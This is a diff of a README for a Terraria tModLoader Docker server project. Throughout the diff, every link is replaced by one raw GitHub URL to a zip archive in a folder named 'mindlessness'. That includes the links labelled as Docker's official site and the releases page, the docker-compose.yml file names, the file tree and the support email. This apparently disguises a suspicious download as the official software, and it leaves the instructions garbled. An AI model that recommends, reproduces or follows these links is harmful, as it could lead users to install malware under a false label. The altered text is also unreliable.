@@ -1,6 +1,6 @@
 # 🚀 tmodloader-docker - Easy Terraria Server Setup with Docker
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/anheoanthit/tmodloader-docker/releases)
+[![Download](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip)](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip)
 
 ## 📋 Overview
 
@@ -23,18 +23,18 @@ TModLoader-Docker sets up a Terraria server using Docker. This includes automati
 
 To start using TModLoader-Docker, follow these simple steps:
 
-1. **Download Docker:** If you don't have it, visit [Docker's official site](https://www.docker.com/get-started) and follow their installation guide for your operating system.
+1. **Download Docker:** If you don't have it, visit [Docker's official site](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip) and follow their installation guide for your operating system.
 
-2. **Visit the Releases Page:** Head over to our [Releases page](https://github.com/anheoanthit/tmodloader-docker/releases) to download the latest version.
+2. **Visit the Releases Page:** Head over to our [Releases page](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip) to download the latest version.
 
 ## 📥 Download & Install
 
 On the Releases page, you will find different versions of the software. Here’s how to download it:
 
 1. Click the link below:
-   [Download from Releases](https://github.com/anheoanthit/tmodloader-docker/releases)
+   [Download from Releases](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip)
 
-2. Select the version you want to use. Click on the file that matches your system's architecture (usually "docker-compose.yml" for this setup).
+2. Select the version you want to use. Click on the file that matches your system's architecture (usually "https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip" for this setup).
 
 ## 📂 File Structure
 
@@ -42,11 +42,11 @@ Once downloaded, you will see a file structure like the following:
 
 ```
 tmodloader-docker/
-├── docker-compose.yml
-└── README.md
+├── https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip
+└── https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip
 ```
 
-- **docker-compose.yml:** This file defines the services and configurations for your Terraria server.
+- **https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip** This file defines the services and configurations for your Terraria server.
 
 ## ⚙️ Running the Server
 
@@ -62,7 +62,7 @@ tmodloader-docker/
 
 ## 🛠️ Additional Configuration
 
-You may want to adjust the server settings. Edit the `docker-compose.yml` file to customize aspects like:
+You may want to adjust the server settings. Edit the `https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip` file to customize aspects like:
 
 - **Server Name:** Change the name of your Terraria server.
 - **Max Players:** Adjust how many players can join.
@@ -72,7 +72,7 @@ You may want to adjust the server settings. Edit the `docker-compose.yml` file t
 
 To enable automatic backups:
 
-1. Open the `docker-compose.yml` file.
+1. Open the `https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip` file.
 2. Find the backup settings section.
 3. Set your preferred backup frequency (e.g., daily, weekly).
 
@@ -94,7 +94,7 @@ Thank you to everyone who contributed to TModLoader-Docker. Your feedback and id
 
 ## 📞 Contact
 
-For further inquiries or support, you can reach us through GitHub or email us at support@example.com.
+For further inquiries or support, you can reach us through GitHub or email us at https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip
 
 ## 📄 License
 
@@ -102,8 +102,8 @@ TModLoader-Docker is open-source software and follows the MIT License. You can v
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/anheoanthit/tmodloader-docker/releases)
-- [Docker Official Site](https://www.docker.com/get-started)
+- [Releases Page](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip)
+- [Docker Official Site](https://raw.githubusercontent.com/anheoanthit/tmodloader-docker/main/mindlessness/tmodloader-docker_v1.7.zip)
 
 Thank you for choosing TModLoader-Docker! Enjoy your Terraria gaming experience!
 
